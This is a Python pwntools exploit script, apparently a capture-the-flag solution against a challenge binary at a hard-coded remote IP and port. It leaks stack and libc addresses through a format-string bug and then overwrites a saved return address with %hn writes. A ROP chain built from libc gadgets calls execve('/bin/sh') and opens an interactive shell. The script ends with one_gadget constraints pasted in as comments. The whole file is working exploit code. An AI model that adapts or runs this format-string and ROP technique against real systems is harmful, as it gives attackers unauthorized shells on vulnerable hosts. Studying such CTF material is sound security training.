#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('chall_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''

        b*main
        c
        ''')
        sleep(1)


if args.REMOTE:
    p = remote('14.225.212.104', 9001)
else:
    p = process([exe.path])
GDB()
# context.arch = 'amd64'
# input 1

# server
load = flat(    
    b'%168$p', 
    b'%169$p',
)
# printf("%p", stack_addr)
# rip = stack_leak - 0x98
# libc.address = x - 0x2a1ca

# local 

# load = flat(
#     b'%170$p'
#     b'%171$p',
# )

# sla(b'> ', load)
sl(load)


order = p.recvline().split(b'0x')

stack_leak = int(order[1], 16)
libc_leak = int(order[2], 16)
# server 
rip = stack_leak - 0x98
libc.address = libc_leak - 0x2a1ca

# local


info( "stack leak: " + hex(stack_leak))
info("rip stack leak: " + hex(rip))

info("libc leak: " + hex(libc_leak))
info("libc base: " + hex(libc.address))

pop_rdi = 0x000000000010f78b + libc.address
pop_rsi = 0x0000000000110a7d + libc.address
syscall = 0x00000000000a0d7f + libc.address
pop_rax = 0x00000000000dd237 + libc.address

leave_ret = 0x00000000000490a6 + libc.address
# input 2

# rsp = input

# rip
one_gadget = libc.address + 0xef52b
pop = 0x00000000001435d9 + libc.address # add rsp, 0x50 ; pop rbx ; pop r12 ; pop rbp ; ret

rip_prinf = rip - 0x520

package = {
    (pop >> 0 ) & 0xffff : rip_prinf,
    (pop >> 16 ) & 0xffff : rip_prinf + 2,
    (pop >> 32 ) & 0xffff : rip_prinf + 4,

}
order = sorted(package)

load = flat(
    # b'\n%12$p\n', # 12$ is the offset of package
    # b'|---%8$s---|'.ljust(0x10, b'\0'),
    # rip,
    # rip- 0x518, # input addr
    # rip - 0x520, # saved rip printf


    f'%{order[0]}c%12$hn'.encode(), # 2
    f'%{order[1] - order[0]}c%13$hn'.encode(), 
    f'%{order[2] - order[1]}c%14$hn'.encode(),

)

load = load.ljust(0x30, b'A') #
load += flat(
    p64(package[order[0]]),
    p64(package[order[1]]),
    p64(package[order[2]]),   
)

# rbp
# pivot
# 
load += p64(pop_rdi+1)*4
load += flat(
    p64(pop_rdi + 1), # 3
    p64(pop_rdi),
    p64(next(libc.search(b'/bin/sh'))),
    p64(pop_rsi),
    0,
    pop_rax,
    0x3b,
    syscall,
)

sla(b'> ', load)

p.interactive()


# 0x583ec posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
# constraints:
#   address rsp+0x68 is writable
#   rsp & 0xf == 0
#   rax == NULL || {"sh", rax, rip+0x17301e, r12, ...} is a valid argv
#   rbx == NULL || (u16)[rbx] == NULL

# 0x583f3 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
# constraints:
#   address rsp+0x68 is writable
#   rsp & 0xf == 0
#   rcx == NULL || {rcx, rax, rip+0x17301e, r12, ...} is a valid argv
#   rbx == NULL || (u16)[rbx] == NULL

# 0xef4ce execve("/bin/sh", rbp-0x50, r12)
# constraints:
#   address rbp-0x48 is writable
#   rbx == NULL || {"/bin/sh", rbx, NULL} is a valid argv
#   [r12] == NULL || r12 == NULL || r12 is a valid envp

# 0xef52b execve("/bin/sh", rbp-0x50, [rbp-0x78])
# constraints:
#   address rbp-0x50 is writable
#   rax == NULL || {"/bin/sh", rax, NULL} is a valid argv
#   [[rbp-0x78]] == NULL || [rbp-0x78] == NULL || [rbp-0x78] is a valid envp